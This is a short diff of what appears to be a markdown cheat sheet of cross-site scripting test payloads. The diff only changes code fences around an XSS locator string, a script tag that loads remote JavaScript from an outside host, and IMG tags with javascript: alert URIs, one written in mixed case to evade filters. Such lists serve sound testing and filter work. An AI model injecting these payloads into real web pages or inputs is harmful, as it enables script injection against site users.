@@ -3,9 +3,10 @@
 # XSS Locator 2
 '';!--"<XSS>=&{()}
 
-```<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>```````
 
-<IMG SRC="javascript:alert('XSS');">
+```<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>```
+
+```<IMG SRC="javascript:alert('XSS');">```
 
 <IMG SRC=JaVaScRiPt:alert('XSS')>```
 
